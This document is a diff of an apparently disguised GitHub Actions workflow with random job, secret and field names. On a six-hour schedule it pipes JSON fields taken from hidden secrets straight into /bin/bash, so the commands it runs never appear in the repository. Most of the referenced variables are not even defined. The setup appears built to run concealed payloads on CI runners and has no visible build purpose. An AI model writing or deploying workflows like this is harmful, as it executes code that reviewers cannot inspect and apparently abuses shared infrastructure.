@@ -2,23 +2,25 @@ name: yanzischuc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
-
+    - cron: '24 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yanzischuc
         env:
-          aa464: ${{ secrets.aa464 }}
+          umn3: ${{ secrets.umn3 }}
         run: |
-          echo $aa464 | jq -r .c0 | /bin/bash
-          echo $x1718 | jq -r .mh0769 | /bin/bash
-          echo $tswx55270 | jq -r .b36 | /bin/bash
-          echo $dnls4 | jq -r .y968 | /bin/bash
-          echo $junq64865 | jq -r .chaei7217 | /bin/bash
-          echo $mlvz35 | jq -r .aipfo3941 | /bin/bash
-          echo $rytpj5 | jq -r .yr5696 | /bin/bash
+          echo $umn3 | jq -r .wmnk619 | /bin/bash
+          echo $al65993 | jq -r .l09 | /bin/bash
+          echo $w2 | jq -r .dpzf67 | /bin/bash
+          echo $pujbb7894 | jq -r .t059 | /bin/bash
+          echo $ozl136 | jq -r .h9 | /bin/bash
+          echo $cm2354 | jq -r .xte69413 | /bin/bash
+          echo $t3211 | jq -r .aby68 | /bin/bash
+          echo $uot12 | jq -r .qylf0962 | /bin/bash
+          echo $ixucu99 | jq -r .nle32 | /bin/bash
+          echo $yurvo16 | jq -r .ha5 | /bin/bash
+          echo $xuau07786 | jq -r .qwfh26 | /bin/bash
 
